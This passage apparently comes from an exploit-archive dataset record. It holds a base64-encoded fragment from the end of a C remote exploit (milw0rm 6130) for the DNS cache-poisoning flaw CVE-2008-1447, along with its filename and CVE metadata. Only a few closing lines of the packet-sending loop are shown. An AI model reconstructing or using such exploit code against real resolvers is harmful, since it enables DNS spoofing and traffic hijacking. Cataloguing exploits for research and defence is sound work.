DQogICAgICAgICAgICAgICBwb3J0X3Jlc29sdmVyLCByLCBuYW1lLCAiMS4xLjEuMSIsIGRvbWFpbiwgbnMsIGFueWlwKTsNCiAgICAgICAgIGlmIChpcF9zZW5kKGlwaCwgYnVmLCBsZW4pICE9IGxlbikNCiAgICAgICAgICAgIGVycigxLCAiaXBfc2VuZCIpOw0KICAgICAgfQ0KICAgICAgY250Kys7DQogICB9DQogICBpcF9jbG9zZShpcGgpOw0KICAgcmV0dXJuIDA7DQp9DQoNCi8vIG1pbHcwcm0uY29tIFsyMDA4LTA3LTI1XQ==", 
    "filename": "platforms/multiple/remote/6130.c", 
    "id": "6130", 
    "cves": [
        "CVE-2008-1447"
    ]
}